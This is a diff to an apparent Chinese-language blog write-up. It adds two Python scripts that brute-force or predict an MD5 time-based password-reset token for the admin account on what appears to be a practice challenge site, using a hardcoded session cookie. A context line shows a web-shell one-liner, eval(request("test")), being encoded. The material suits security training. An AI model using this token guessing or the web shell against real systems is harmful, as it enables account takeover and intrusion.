@@ -171,6 +171,34 @@ print enc('eval(request("test"))','5678')
 {% endhighlight %}
 
 {% highlight python %}
+#requests模块的使用
+方法1：
+import requests
+import hashlib
+s = requests.Session()
+header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=45204efb16a5fba91c9159e1fe65b0e5'}
+for x in xrange(615, 1000):
+    pwd = hashlib.new('md5', '1417336' + str(x)).hexdigest()
+    url = 'http://1.hacklist.sinaapp.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
+    r = s.get(url, headers=header)
+    if r.content != '':
+        print r.content
+        break
+    else:
+        print '正在破解中……', pwd
+方法2：
+import requests
+import hashlib
+import time
+s = requests.Session()
+header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=45204efb16a5fba91c9159e1fe65b0e5'}
+while True:
+    pwd = hashlib.new('md5', str(int(time.time()))).hexdigest()
+    url = 'http://1.hacklist.sinaapp.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
+    r = s.get(url, headers=header)
+    time.sleep(0.8)
+    if r.content != '':
+       同上省略.....
 {% endhighlight %}
 
 {% highlight python %}
